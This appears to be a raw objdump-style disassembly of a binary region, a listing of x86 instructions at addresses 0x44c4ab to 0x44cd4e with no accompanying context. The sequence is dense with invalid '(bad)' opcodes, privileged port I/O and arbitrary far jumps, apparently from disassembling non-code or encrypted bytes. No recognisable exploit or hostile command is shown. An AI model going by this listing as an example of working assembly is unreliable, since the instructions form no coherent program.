  44c4ab:	push   ebp
  44c4ac:	and    ebx,DWORD PTR [ebp+0x51]
  44c4af:	pop    eax
  44c4b0:	loope  0x44c509
  44c4b2:	push   ebp
  44c4b3:	addr16 loop 0x44c511
  44c4b6:	and    BYTE PTR [eax+0xd],ch
  44c4b9:	add    bl,al
  44c4bb:	add    ecx,ecx
  44c4bd:	push   edx
  44c4be:	ss dec eax
  44c4c0:	retf   0x444b
  44c4c3:	cmp    dl,ch
  44c4c5:	push   esp
  44c4c6:	dec    esp
  44c4c7:	cmp    ah,ah
  44c4c9:	cmp    DWORD PTR [eax+0x60],eax
  44c4cc:	out    dx,al
  44c4cd:	sub    edx,DWORD PTR [eax]
  44c4cf:	pop    edi
  44c4d0:	scas   al,BYTE PTR es:[edi]
  44c4d1:	jmp    DWORD PTR [ecx]
  44c4d3:	pop    es
  44c4d4:	mov    cl,0x4e
  44c4d6:	sbb    edx,DWORD PTR [esi-0x28]
  44c4d9:	dec    edi
  44c4da:	adc    BYTE PTR [ebx+0xd],al
  44c4dd:	add    BYTE PTR [eax+0x5],dl
  44c4e0:	int3   
  44c4e1:	pop    esp
  44c4e2:	repz cmp DWORD PTR [ebx+edx*2+0x5ebbfc00],esi
  44c4ea:	dec    edx
  44c4eb:	or     BYTE PTR [edx+0xd6425e],dh
	...
  44c50d:	add    BYTE PTR [eax+0x2e],ah
  44c510:	imul   ecx,ebp,0xa463555b
  44c516:	ins    DWORD PTR es:[edi],dx
  44c517:	dec    ebp
  44c518:	push   0xffffffd5
  44c51a:	ds push edi
  44c51c:	xlat   BYTE PTR ds:[bx]
  44c51e:	inc    edx
  44c51f:	das    
  44c520:	add    BYTE PTR [edx+0x8],ch
  44c523:	aas    
  44c524:	arpl   WORD PTR [ebp-0x4694a2de],di
  44c52a:	inc    esp
  44c52b:	pop    ecx
  44c52c:	ins    BYTE PTR es:[edi],dx
  44c52d:	mov    WORD PTR [ecx+eiz*1+0x6b],cs
  44c531:	test   BYTE PTR ds:0x11890000,al
  44c537:	xor    eax,0x3e2b9769
  44c53c:	addr16 xchg ebp,eax
  44c53e:	xor    edi,DWORD PTR ds:0xd70e9678
  44c544:	std    
  44c545:	lahf   
  44c546:	sub    al,0x4c
  44c548:	arpl   WORD PTR [ebx+0x32],di
  44c54b:	push   edi
  44c54c:	pop    ebp
  44c54d:	push   edx
  44c54e:	hlt    
  44c54f:	pop    ebx
  44c550:	inc    edi
  44c551:	dec    edi
  44c552:	out    dx,al
  44c553:	push   ecx
  44c554:	arpl   WORD PTR [esp+eiz*8+0x55],ax
  44c558:	je     0x44c543
  44c55a:	push   cs
  44c55b:	(bad)  
  44c55d:	das    
  44c55e:	retf   
  44c55f:	dec    ebx
  44c560:	arpl   WORD PTR [ebx],di
  44c562:	in     eax,dx
  44c563:	push   esi
  44c564:	pop    ebp
  44c565:	inc    edx
  44c566:	in     al,0x5b
  44c568:	inc    esp
  44c569:	inc    esp
  44c56a:	out    dx,al
  44c56b:	push   ecx
  44c56c:	arpl   WORD PTR [esp+esi*4],dx
  44c56f:	push   ebp
  44c570:	je     0x44c55b
	...
  44c58e:	add    BYTE PTR [eax],al
  44c590:	push   cs
  44c591:	in     eax,0xfe
  44c593:	sub    ecx,ecx
  44c595:	dec    edi
  44c596:	pop    edi
  44c597:	jmp    FWORD PTR [edx+0x2a006a3c]
  44c59d:	and    al,0x6a
  44c59f:	outs   dx,DWORD PTR ds:[esi]
  44c5a0:	adc    bl,BYTE PTR [edi+0x5d]
  44c5a3:	outs   dx,BYTE PTR ds:[esi]
  44c5a4:	sbb    BYTE PTR [esi],cl
  44c5a6:	je     0x44c61a
  44c5a8:	or     eax,0xcb735f22
  44c5ad:	cld    
  44c5ae:	ret    0xbc02
  44c5b1:	push   edi
  44c5b2:	pop    ecx
  44c5b3:	jo     0x44c55a
  44c5b5:	and    BYTE PTR [edi+ebp*2-0x39],ch
  44c5b9:	cld    
  44c5ba:	mov    BYTE PTR [edx],0x9c
  44c5bd:	push   edi
  44c5be:	pop    ecx
  44c5bf:	jo     0x44c56b
  44c5c1:	cs pop ebp
  44c5c3:	gs in  al,0xfc
  44c5c6:	les    eax,FWORD PTR [edx]
  44c5c8:	lods   al,BYTE PTR ds:[esi]
  44c5c9:	push   edi
  44c5ca:	pop    ecx
  44c5cb:	jo     0x44c644
  44c5cd:	cs pop ebp
  44c5cf:	popa   
  44c5d0:	cwde   
  44c5d1:	push   edi
  44c5d2:	add    BYTE PTR [eax],al
  44c5d4:	mov    bl,0xf8
  44c5d6:	dec    ecx
  44c5d7:	gs xchg edi,eax
  44c5d9:	push   edi
  44c5da:	je     0x44c621
  44c5dc:	sub    bl,BYTE PTR [eax+0x66]
  44c5df:	je     0x44c595
  44c5e1:	cld    
  44c5e2:	jl     0x44c5e4
  44c5e4:	addr16 cs pop ebp
  44c5e7:	popa   
  44c5e8:	sbb    BYTE PTR [eax+0x3d],bl
  44c5eb:	jbe    0x44c5c6
  44c5ed:	and    DWORD PTR [edi+edx*2+0x74],esi
  44c5f1:	cld    
  44c5f2:	lds    eax,FWORD PTR [eax+eax*1]
	...
  44c611:	add    BYTE PTR [eax],bh
  44c613:	cs jno 0x44c65b
  44c616:	xor    ch,BYTE PTR [eax]
  44c618:	pop    ebp
  44c619:	jb     0x44c652
  44c61b:	cs popa 
  44c61d:	je     0x44c5dc
  44c61f:	pop    esp
  44c620:	pop    ecx
  44c621:	ins    BYTE PTR es:[edi],dx
  44c622:	not    DWORD PTR [esi+0x5b]
  44c625:	je     0x44c5f4
  44c627:	and    BYTE PTR [esi+0x0],ah
  44c62a:	(bad)  
  44c62c:	cmp    dh,BYTE PTR [edx+0x9]
  44c62f:	pop    ebx
  44c630:	je     0x44c697
  44c632:	or     eax,0xa26b6705
  44c637:	jmp    0x5f67:0xc4b55466
  44c63e:	test   eax,0xe7ffcd6
  44c643:	sbb    dl,BYTE PTR [ebx+eiz*2-0x5d]
  44c647:	out    0x4d,al
  44c649:	imul   ebp,DWORD PTR [esi-0x34],0x370d6d4d
  44c650:	dec    BYTE PTR [edi+0x7f]
  44c653:	(bad)  
  44c654:	pop    ebp
  44c655:	arpl   WORD PTR [esi-0x26],di
  44c658:	or     eax,0x4ed0532e
  44c65d:	ins    DWORD PTR es:[edi],dx
  44c65e:	pop    ecx
  44c65f:	xchg   esi,eax
  44c660:	cld    
  44c661:	xchg   edi,eax
  44c662:	push   cs
  44c663:	cdq    
  44c664:	dec    esi
  44c665:	imul   ebp,DWORD PTR [esi-0x3c],0xdafe6d4d
  44c66c:	cmp    ah,BYTE PTR [ebx+0x45]
  44c66f:	xchg   ebp,eax
  44c670:	xor    DWORD PTR [eax],eax
  44c672:	or     eax,0x3cfd57
	...
  44c693:	add    BYTE PTR [edi],bh
  44c695:	test   BYTE PTR [ebx+0x74],ah
  44c698:	xor    BYTE PTR [ebp-0x6ece96a7],bl
  44c69e:	ins    BYTE PTR es:[di],dx
  44c6a0:	sbb    eax,0x234d0e7a
  44c6a5:	mov    BYTE PTR [ebp+ebp*2-0xb],cl
  44c6a9:	push   ebp
  44c6aa:	pop    eax
  44c6ab:	add    BYTE PTR ds:0xf040fdeb,cl
  44c6b1:	pop    esp
  44c6b2:	xor    al,0x6e
  44c6b4:	in     al,0x56
  44c6b6:	pop    ebp
  44c6b7:	je     0x44c6a9
  44c6b9:	sbb    BYTE PTR [esi+0x69],cl
  44c6bc:	jmp    0x44c70d
  44c6be:	pusha  
  44c6bf:	arpl   WORD PTR [esi-0x1c98b204],di
  44c6c5:	inc    ebp
  44c6c6:	xor    eax,DWORD PTR [eax]
  44c6c8:	or     eax,0xcc01e300
  44c6cd:	and    al,0x13
  44c6cf:	xor    al,0xab
  44c6d1:	sub    BYTE PTR [ecx],bl
  44c6d3:	arpl   WORD PTR [ecx-0x4badc8dc],di
  44c6d9:	and    eax,0x48ae6010
  44c6de:	or     DWORD PTR [eax-0x44],ebx
  44c6e1:	dec    DWORD PTR [ecx+0x1]
  44c6e4:	ret    0x434
  44c6e7:	push   edx
  44c6e8:	adc    BYTE PTR [eax-0x34],0x51
  44c6ec:	outs   dx,DWORD PTR ds:[esi]
  44c6ed:	das    
  44c6ee:	aad    0x5e
  44c6f0:	pop    edx
  44c6f1:	cs (bad) 
  44c6f3:	data16 xor BYTE PTR [edi],ch
  44c6f6:	aam    0x5d
	...
  44c714:	add    BYTE PTR [eax],al
  44c716:	popa   
  44c717:	and    eax,0xc103b5
  44c71c:	mov    ds:0xc1456166,al
  44c721:	push   ebp
  44c722:	push   0x32
  44c724:	mov    edx,0x9125365d
  44c729:	push   edi
  44c72a:	pop    edi
  44c72b:	and    DWORD PTR [ebp-0x7cdda5a6],edx
  44c731:	pop    sp
  44c733:	add    BYTE PTR [esi],ah
  44c735:	or     BYTE PTR [ecx+0x28],al
  44c738:	jne    0x44c7a0
  44c73a:	inc    edx
  44c73b:	and    al,0xb6
  44c73d:	adc    DWORD PTR [edi+0x29],ecx
  44c740:	jne    0x44c792
  44c742:	sbb    DWORD PTR [eax],eax
  44c744:	and    ecx,DWORD PTR [eax]
  44c746:	loope  0x44c76f
  44c748:	push   ebp
  44c749:	addr16 loop 0x44c76f
  44c74c:	push   ss
  44c74d:	adc    al,bh
  44c74f:	and    al,0x4f
  44c751:	pop    eax
  44c752:	or     eax,0xbc06f800
  44c757:	sub    BYTE PTR [ebx+0x67],cl
  44c75a:	and    BYTE PTR [eax],ch
  44c75c:	dec    eax
  44c75d:	push   edx
  44c75e:	shr    DWORD PTR [esi],0x0
  44c761:	and    al,0xba
  44c763:	sub    esi,DWORD PTR [eax+eax*2-0x31]
  44c767:	ss je  0x44c776
  44c76a:	or     DWORD PTR [ecx+0x33b225fe],edi
  44c770:	dec    eax
  44c771:	or     bl,dl
  44c773:	and    ebp,DWORD PTR [esp+eax*1-0x1a]
  44c777:	sub    DWORD PTR [edx+0x16],esp
	...
  44c796:	add    BYTE PTR [eax],al
  44c798:	mov    edi,0xb7f55f2a
  44c79d:	sub    BYTE PTR [edx-0x17],ch
  44c7a0:	push   cs
  44c7a1:	jp     0x44c7a0
  44c7a3:	and    eax,0xc85e276d
  44c7a8:	bound  ecx,QWORD PTR [ecx+ebp*2-0x36]
  44c7ac:	push   ebp
  44c7ad:	add    BYTE PTR [eax],al
  44c7af:	sub    al,0xc
  44c7b1:	aas    
  44c7b2:	ins    BYTE PTR es:[edi],dx
  44c7b3:	mov    esi,0x9c6c5d6c
  44c7b8:	inc    eax
  44c7b9:	sub    al,0x69
  44c7bb:	retf   0x35
  44c7be:	add    BYTE PTR [esi],ch
  44c7c0:	or     dl,BYTE PTR [esp+ebp*2-0x46]
  44c7c4:	push   ecx
  44c7c5:	and    DWORD PTR [edi+edi*4+0x2f],esi
  44c7c9:	sub    al,0x73
  44c7cb:	test   BYTE PTR [esi],cl
  44c7cd:	enter  0xbd03,0x52
  44c7d1:	sub    ecx,DWORD PTR [ebp-0x7c]
  44c7d4:	inc    edx
  44c7d5:	push   edx
  44c7d6:	pop    edi
  44c7d7:	xchg   ebp,eax
  44c7d8:	cmp    esp,DWORD PTR [ecx]
  44c7da:	add    BYTE PTR [ecx],ch
  44c7dc:	adc    dl,BYTE PTR [ebx+eiz*2+0x7b]
  44c7e0:	xor    esp,DWORD PTR ds:0x20e2886a
  44c7e6:	push   eax
  44c7e7:	pop    ebx
  44c7e8:	out    0x5a,al
  44c7ea:	arpl   WORD PTR [edx-0x1e],bx
  44c7ed:	(bad)  
  44c7ee:	dec    DWORD PTR [ecx]
  44c7f0:	or     BYTE PTR [edx+0x67],al
  44c7f3:	cmp    eax,0x6753ec
  44c7f8:	mov    ecx,0x6f541e
	...
  44c819:	add    BYTE PTR [eax],dh
  44c81b:	pop    ecx
  44c81c:	imul   eax,DWORD PTR [ebp+eax*8+0x4f],0x5d
  44c821:	push   esp
  44c822:	int    0x56
  44c824:	pop    ebp
  44c825:	add    dh,bh
  44c827:	(bad)  
  44c828:	imul   esi,DWORD PTR [ebx+0x20],0x56
  44c82c:	pop    ebx
  44c82d:	jo     0x44c84c
  44c82f:	pop    edx
  44c830:	cmp    DWORD PTR [eax],eax
  44c832:	mov    cl,0x5
  44c834:	aas    
  44c835:	gs and ch,ch
  44c838:	pop    esp
  44c839:	ins    DWORD PTR es:[edi],dx
  44c83a:	adc    al,0xf1
  44c83c:	pop    eax
  44c83d:	je     0x44c84b
  44c83f:	icebp  
  44c840:	(bad)  
  44c841:	call   eax
  44c843:	add    edi,DWORD PTR [esi]
  44c845:	imul   ebx,eax,0xc969541f
  44c84b:	pop    ds
  44c84c:	push   esp
  44c84d:	outs   dx,DWORD PTR ds:[esi]
  44c84e:	test   al,0x59
  44c850:	pop    ebx
  44c851:	popa   
  44c852:	test   al,0x3e
  44c854:	popa   
  44c855:	ins    BYTE PTR es:[edi],dx
  44c856:	shr    esp,1
  44c858:	pusha  
  44c859:	ins    DWORD PTR es:[edi],dx
  44c85a:	rol    DWORD PTR [eax],1
  44c85c:	pop    edi
  44c85d:	add    ebp,DWORD PTR [ecx-0x328b93b1]
  44c863:	inc    edx
  44c864:	jno    0x44c8da
  44c866:	xchg   ecx,eax
  44c867:	in     al,dx
  44c868:	push   di
  44c86a:	popf   
  44c86b:	pop    esp
  44c86c:	pop    ebp
  44c86d:	inc    ebx
  44c86e:	mov    WORD PTR [ebx],fs
  44c870:	push   0x0
  44c872:	(bad)  
  44c874:	imul   esi,DWORD PTR [ebx+0x20],0x53
  44c878:	pop    ebx
  44c879:	popa   
  44c87a:	and    dl,dh
  44c87c:	(bad)  
  44c87d:	inc    DWORD PTR [eax]
	...
  44c89b:	add    dh,dh
  44c89d:	add    eax,0x50956548
  44c8a2:	dec    edx
  44c8a3:	gs xor eax,0xc76f6c58
  44c8a9:	add    eax,DWORD PTR [edx+0x2]
  44c8ac:	or     eax,0xbd745eee
  44c8b1:	pop    eax
  44c8b2:	push   ebp
  44c8b3:	pop    ebp
  44c8b4:	call   0xf08d19b2
  44c8b9:	inc    edi
  44c8ba:	push   esp
  44c8bb:	add    BYTE PTR ds:0xb04103c7,cl
  44c8c1:	bnd ds js 0x44c879
  44c8c5:	sbb    al,BYTE PTR [ecx+0x69]
  44c8c8:	mov    cl,0x3
  44c8ca:	xor    BYTE PTR [eax-0x41],ch
  44c8cd:	or     esp,DWORD PTR [ebx+0x64]
  44c8d0:	or     eax,0x9e6bfee3
  44c8d5:	mov    edx,0xb6a85d52
  44c8da:	pop    ebx
  44c8db:	aas    
  44c8dc:	or     eax,0x7041034b
  44c8e1:	mov    ch,0x2e
  44c8e3:	arpl   WORD PTR [edi-0x2a],di
  44c8e6:	pop    ebx
  44c8e7:	imul   ebp,DWORD PTR [ebx+0x64],0x570d5144
  44c8ee:	stc    
  44c8ef:	push   ecx
  44c8f0:	je     0x44c8c9
  44c8f2:	dec    eax
  44c8f3:	jae    0x44c961
  44c8f5:	aad    0x33
  44c8f7:	jae    0x44c969
  44c8f9:	ja     0x44c946
  44c8fb:	inc    ebx
  44c8fc:	push   ebp
  44c8fd:	test   eax,0xbcfc
	...
  44c91e:	push   cs
  44c91f:	xchg   edi,eax
  44c920:	pop    edi
  44c921:	pop    edi
  44c922:	sub    DWORD PTR [ecx+0x52],edi
  44c925:	imul   ebp,DWORD PTR [esi],0x406d5184
  44c92b:	mov    WORD PTR [edi+0x69],ss
  44c92e:	pop    ds
  44c92f:	nop
  44c930:	cld    
  44c931:	out    dx,eax
  44c932:	or     DWORD PTR [ebx+0x34216e5b],ebx
  44c938:	fs ins BYTE PTR es:[edi],dx
  44c93a:	cmp    eax,0xf0745637
  44c93f:	test   DWORD PTR [eax+0x43],ecx
  44c942:	add    eax,0xb603e700
  44c947:	add    al,0x36
  44c949:	dec    ebx
  44c94a:	loopne 0x44c97f
  44c94c:	dec    esp
  44c94d:	push   edi
  44c94e:	shr    DWORD PTR [eax],0x3c
  44c951:	pop    edi
  44c952:	mov    ecx,0xe95b292a
  44c957:	and    al,0x13
  44c959:	pop    ebx
  44c95a:	out    0x24,al
  44c95c:	out    0x3,eax
  44c95e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44c95f:	(bad)  
  44c960:	and    DWORD PTR [edi-0x47],ebx
  44c963:	push   ebx
  44c964:	adc    BYTE PTR [edi-0x52],dl
  44c967:	push   ebp
  44c968:	or     bl,BYTE PTR [edx-0x52]
  44c96b:	dec    eax
  44c96c:	add    DWORD PTR [edx-0x4c],esp
  44c96f:	sub    eax,0x289962fc
  44c974:	adc    bl,BYTE PTR [edx+0xd]
  44c977:	add    dh,ah
  44c979:	add    eax,0x37fb24cc
  44c97e:	je     0x44c99f
  44c980:	or     BYTE PTR [eax+0x0],bl
	...
  44c99f:	add    BYTE PTR [ecx+0x29],bl
  44c9a2:	aam    0x5e
  44c9a4:	or     eax,0x59002400
  44c9a9:	sub    al,0xd6
  44c9ab:	inc    edx
  44c9ac:	jns    0x44c9da
  44c9ae:	mov    edx,0x29000d64
  44c9b3:	add    BYTE PTR [ecx+0x2c],al
  44c9b6:	mov    dh,0x41
  44c9b8:	arpl   WORD PTR ds:0x3b903cc,sp
  44c9be:	xchg   ecx,eax
  44c9bf:	pop    edx
  44c9c0:	xor    esi,DWORD PTR [esp+ebx*4]
  44c9c3:	bound  ebp,QWORD PTR [ecx]
  44c9c5:	inc    edx
  44c9c6:	xchg   ebp,eax
  44c9c7:	pop    esi
  44c9c8:	add    BYTE PTR cs:[eax],al
  44c9cb:	add    BYTE PTR [edi],bh
  44c9cd:	sub    DWORD PTR [ebp-0x6cdee1b1],edx
  44c9d3:	inc    edx
  44c9d4:	sub    DWORD PTR [edx+ecx*4],ebp
  44c9d7:	fs or  eax,0x8aea0000
  44c9dd:	dec    esp
  44c9de:	arpl   WORD PTR [ebp+eiz*8+0x2d],di
  44c9e2:	arpl   WORD PTR ds:0x4a6329d6,bp
  44c9e8:	(bad)  [eax]
  44c9ea:	outs   dx,BYTE PTR ds:[esi]
  44c9eb:	push   eax
  44c9ec:	sbb    al,0x0
  44c9ee:	add    BYTE PTR [ecx],dh
  44c9f0:	or     eax,0x1a3d634d
  44c9f5:	sub    ch,BYTE PTR [esi+0x4e]
  44c9f8:	mov    ebx,0xea4d6946
  44c9fd:	(bad)  
  44c9fe:	call   FWORD PTR [ebp+0xf]
  44ca01:	inc    ecx
  44ca02:	arpl   WORD PTR ds:0x0,bx
	...
  44ca20:	add    BYTE PTR [eax],al
  44ca22:	shr    BYTE PTR [eax],1
  44ca24:	imul   ebx,DWORD PTR [ecx],0xffffffc2
  44ca27:	xor    esp,DWORD PTR [ebx+0x1b]
  44ca2a:	out    0x5a,eax
  44ca2c:	imul   eax,DWORD PTR [esp+ebx*8],0xffffffff
  44ca30:	(bad)  
  44ca31:	sti    
  44ca32:	adc    DWORD PTR [ecx+0x70],ecx
  44ca35:	add    al,0xb7
  44ca37:	ds jb  0x44ca46
  44ca3a:	addr16 xor al,0x51
  44ca3d:	jmp    0xae434350
  44ca42:	pop    ebx
  44ca43:	xor    al,0x3d
  44ca45:	aam    0x58
  44ca47:	sub    ah,BYTE PTR [ebx-0x39]
  44ca4a:	pop    edx
  44ca4b:	push   eax
  44ca4c:	outs   dx,BYTE PTR ds:[esi]
  44ca4d:	mov    esi,0xba6d1d69
  44ca52:	pop    ss
  44ca53:	and    al,0x0
  44ca55:	mov    dl,0x13
  44ca57:	dec    edx
  44ca58:	dec    edx
  44ca59:	lods   al,BYTE PTR ds:[esi]
  44ca5a:	add    ch,bl
  44ca5c:	sub    eax,0x6c2c62ff
  44ca61:	jmp    0xa5443174
  44ca66:	push   edi
  44ca67:	sub    esi,DWORD PTR [eax-0x78]
  44ca6a:	pop    edx
  44ca6b:	pop    ebx
  44ca6c:	push   0x6d2b439c
  44ca71:	add    BYTE PTR [ebp-0x5ba8a2e0],al
  44ca77:	std    
  44ca78:	sub    al,BYTE PTR [edx]
  44ca7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ca7b:	pop    edx
  44ca7c:	pop    ebp
  44ca7d:	imul   esp,DWORD PTR [ecx-0x3a8c94a6],0x58
  44ca84:	pop    ebp
  44ca85:	push   edi
	...
  44caa2:	add    BYTE PTR [eax],al
  44caa4:	fs std 
  44caa6:	sti    
  44caa7:	add    ch,BYTE PTR [eax]
  44caa9:	dec    esi
  44caaa:	pop    ecx
  44caab:	outs   dx,BYTE PTR ds:[esi]
  44caac:	(bad)  
  44caad:	push   edi
  44caae:	pop    ecx
  44caaf:	je     0x44ca7a
  44cab1:	neg    BYTE PTR [ebx+esi*2+0x17]
  44cab5:	and    ebx,DWORD PTR [edi+0x65]
  44cab8:	xor    al,0xfd
  44caba:	sbb    eax,DWORD PTR [edx]
  44cabc:	and    DWORD PTR [ebp+0x5f],ecx
  44cabf:	push   edi
  44cac0:	add    eax,0x346745b
  44cac5:	dec    esi
  44cac6:	inc    ebp
  44cac7:	jne    0x44cad9
  44cac9:	push   eax
  44caca:	popa   
  44cacb:	jo     0x44caed
  44cacd:	and    BYTE PTR [edi+0x62],al
  44cad0:	(bad)  
  44cad1:	push   ds
  44cad2:	pop    ebx
  44cad3:	je     0x44caec
  44cad5:	std    
  44cad6:	jne    0x44cad9
  44cad8:	cmp    ebx,DWORD PTR [edi]
  44cada:	je     0x44cb2f
  44cadc:	std    
  44cadd:	dec    ebp
  44cade:	je     0x44cb45
  44cae0:	loope  0x44cad9
  44cae2:	pop    esp
  44cae3:	je     0x44cabb
  44cae5:	pop    ebx
  44cae6:	pop    ebx
  44cae7:	jae    0x44cadd
  44cae9:	cld    
  44caea:	cmp    al,0x1
  44caec:	stos   DWORD PTR es:[edi],eax
  44caed:	pop    ds
  44caee:	je     0x44cb3c
  44caf0:	lds    ecx,FWORD PTR [ebp+0x74]
  44caf3:	dec    ecx
  44caf4:	ret    0x6d4c
  44caf7:	je     0x44cb66
  44caf9:	push   edx
  44cafa:	pop    esi
  44cafb:	outs   dx,DWORD PTR ds:[esi]
  44cafc:	mov    ah,0xfc
  44cafe:	cmp    eax,DWORD PTR [eax]
  44cb00:	addr16 push esp
  44cb02:	pop    ecx
  44cb03:	jb     0x44cb7e
  44cb05:	dec    esp
  44cb06:	jo     0x44cb6d
	...
  44cb24:	add    BYTE PTR [eax],al
  44cb26:	or     eax,0xd002995
  44cb2b:	jns    0x44cb29
  44cb2d:	cmp    al,0x25
  44cb2f:	mov    BYTE PTR [esi+0x4c],cl
  44cb32:	and    dh,BYTE PTR [edx]
  44cb34:	pusha  
  44cb35:	outs   dx,BYTE PTR ds:[esi]
  44cb36:	loop   0x44cade
  44cb38:	cld    
  44cb39:	aaa    
  44cb3a:	or     eax,0xff5f5466
  44cb3f:	cli    
  44cb40:	push   eax
  44cb41:	dec    ecx
  44cb42:	call   0xd44f492
  44cb47:	add    al,0xfe
  44cb49:	dec    eax
  44cb4a:	fld    QWORD PTR [ebx+0x52]
  44cb4d:	push   ecx
  44cb4e:	in     al,0x50
  44cb50:	pusha  
  44cb51:	imul   ebx,edx,0xc15f5015
  44cb57:	aas    
  44cb58:	push   ecx
  44cb59:	push   0xffffffda
  44cb5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44cb5c:	cld    
  44cb5d:	test   BYTE PTR [edx+ebp*8],cl
  44cb60:	pop    esi
  44cb61:	je     0x44cb3b
  44cb63:	adc    eax,0x4da6e5f
  44cb68:	push   esi
  44cb69:	arpl   WORD PTR [esi-0x4c95c4ee],bp
  44cb6f:	adc    DWORD PTR [esi+0x6b],ecx
  44cb72:	lods   al,BYTE PTR ds:[esi]
  44cb73:	mov    dl,0x5b
  44cb75:	imul   edi,DWORD PTR [ebx+0x16],0x1a0fb604
  44cb7c:	pop    edi
  44cb7d:	je     0x44cbe0
  44cb7f:	ror    DWORD PTR [esi+0x63],1
  44cb82:	ins    BYTE PTR es:[edi],dx
  44cb83:	mov    ebp,0xc25e6338
  44cb88:	dec    eax
  44cb89:	imul   eax,DWORD PTR [eax],0x0
	...
  44cba7:	add    BYTE PTR [ebp-0x57],bl
  44cbaa:	cld    
  44cbab:	inc    ebp
  44cbac:	or     eax,0x5e69506a
  44cbb1:	mov    esp,0xc23e6338
  44cbb6:	dec    eax
  44cbb7:	imul   edi,DWORD PTR ds:0xf27fca9,0x2e53b200
  44cbc1:	mov    es:0x9b2b3860,eax
  44cbc7:	push   esi
  44cbc8:	sbb    eax,0x2503e74f
  44cbcd:	add    DWORD PTR [edx+0x75501960],ebp
  44cbd3:	push   esi
  44cbd4:	call   0xdc9741f5
  44cbd9:	sub    BYTE PTR [ecx+0x5f],bh
  44cbdc:	in     al,0x2e
  44cbde:	ss push eax
  44cbe0:	shr    BYTE PTR [ebx],cl
  44cbe2:	push   eax
  44cbe3:	push   ebp
  44cbe4:	idiv   edi
  44cbe6:	push   esi
  44cbe7:	add    al,0x20
  44cbe9:	xor    al,BYTE PTR [ebx+eiz*2-0x1f]
  44cbed:	sbb    al,0x1a
  44cbef:	pop    ebx
  44cbf0:	out    0x1b,eax
  44cbf2:	dec    edx
  44cbf3:	dec    ebp
  44cbf4:	fsubr  DWORD PTR [ebx]
  44cbf6:	dec    eax
  44cbf7:	push   eax
  44cbf8:	stos   BYTE PTR es:[edi],al
  44cbf9:	cmp    DWORD PTR es:0x431000d,ebp
  44cc00:	lock and ecx,DWORD PTR [edx]
  44cc03:	push   ecx
  44cc04:	scas   al,BYTE PTR es:[edi]
  44cc05:	dec    esi
  44cc06:	add    BYTE PTR [esi-0x57],dl
  44cc09:	adc    dh,BYTE PTR es:[ecx]
	...
  44cc28:	add    BYTE PTR [eax],al
  44cc2a:	mov    eax,ds:0xa45afb20
  44cc2f:	and    eax,0x18b03e7
  44cc34:	sub    bl,BYTE PTR [edi+0x79]
  44cc37:	dec    esp
  44cc38:	call   DWORD PTR [ecx+0x6e]
  44cc3b:	and    ebx,ecx
  44cc3d:	aas    
  44cc3e:	outs   dx,BYTE PTR ds:[esi]
  44cc3f:	xor    ecx,esi
  44cc41:	dec    edi
  44cc42:	je     0x44cc74
  44cc44:	out    0x3,eax
  44cc46:	stos   DWORD PTR es:[edi],eax
  44cc47:	add    DWORD PTR [esi-0x4aaf9ea2],esi
  44cc4d:	push   esp
  44cc4e:	xor    BYTE PTR ds:0x295c50b6,bl
  44cc54:	add    bh,al
  44cc56:	bound  ebp,QWORD PTR [ecx]
  44cc58:	jno    0x44cbf4
  44cc5a:	dec    edx
  44cc5b:	push   edi
  44cc5c:	je     0x44cbee
  44cc5e:	pop    ecx
  44cc5f:	sub    al,BYTE PTR [eax]
  44cc61:	mov    edi,0x8c6df50e
  44cc66:	das    
  44cc67:	sub    al,0x63
  44cc69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44cc6a:	cmp    esp,DWORD PTR ds:0x30397d65
  44cc70:	push   ecx
  44cc71:	jmp    0xae435684
  44cc76:	jecxz  0x44cca3
  44cc78:	push   ecx
  44cc79:	and    al,0x1b
  44cc7c:	imul   ebx,DWORD PTR [esi+0x9],0xca39fe2d
  44cc83:	sub    DWORD PTR [esp-0x3e],esp
  44cc87:	and    al,0x6d
  44cc89:	dec    eax
  44cc8a:	mov    eax,0x505422
	...
  44ccab:	add    BYTE PTR [edx-0x22cb96de],bh
  44ccb1:	push   eax
  44ccb2:	add    BYTE PTR [ebp+0x3563450c],ch
  44ccb8:	call   0xd85236db
  44ccbd:	xor    BYTE PTR [esi+ecx*1-0x3d],cl
  44ccc1:	and    BYTE PTR [ecx-0x17],dl
  44ccc4:	push   cs
  44ccc5:	and    edi,esi
  44ccc7:	cmp    bh,BYTE PTR [edx-0x43f79cdd]
  44cccd:	and    al,BYTE PTR [edx+ebp*1+0x11]
  44ccd1:	xchg   edx,eax
  44ccd2:	(bad)  
  44ccd3:	sub    eax,0x512c62
  44ccd8:	arpl   WORD PTR [ecx+ebp*2],bx
  44ccdb:	fidivr WORD PTR [edx]
  44ccdd:	daa    
  44ccde:	push   0xffffffc6
  44cce0:	cmp    DWORD PTR [eax],eax
  44cce2:	add    BYTE PTR [eax],cl
  44cce4:	push   cs
  44cce5:	aas    
  44cce6:	arpl   bp,dx
  44cce8:	sbb    dh,bl
  44ccea:	(bad)  
  44cceb:	(bad)  
  44ccec:	clc    
  44cced:	dec    BYTE PTR [esi+0x69]
  44ccf0:	ficom  DWORD PTR [ebp+0x67]
  44ccf3:	ja     0x44cd67
  44ccf5:	dec    edi
  44ccf6:	ins    DWORD PTR es:[di],dx
  44ccf8:	xchg   esp,eax
  44ccf9:	dec    esp
  44ccfa:	popa   
  44ccfb:	outs   dx,BYTE PTR ds:[esi]
  44ccfc:	nop
  44ccfd:	add    edi,esp
  44ccff:	add    DWORD PTR [eax+0x4c],edi
  44cd02:	pop    ecx
  44cd03:	fs ins DWORD PTR es:[edi],dx
  44cd05:	dec    esi
  44cd06:	pop    ecx
  44cd07:	addr16 xchg ecx,eax
  44cd09:	in     al,0xff
  44cd0b:	jmp    DWORD PTR [ecx]
  44cd0d:	add    bh,BYTE PTR [edi]
  44cd0f:	add    BYTE PTR gs:[eax],al
	...
  44cd2e:	add    ch,ah
  44cd30:	data16 jo 0x44ccd6
  44cd33:	pop    edx
  44cd34:	data16 fs sti 
  44cd37:	inc    ebx
  44cd38:	add    BYTE PTR [eax],al
  44cd3a:	mov    al,0xfb
  44cd3c:	inc    eax
  44cd3d:	jae    0x44cd65
  44cd3f:	out    0x5a,eax
  44cd41:	je     0x44cd74
  44cd43:	out    dx,eax
  44cd44:	outs   dx,DWORD PTR ds:[esi]
  44cd45:	je     0x44cd04
  44cd47:	sti    
  44cd48:	mov    ds:0x73e72301,eax
  44cd4d:	push   edi
  44cd4e:	(bad)  
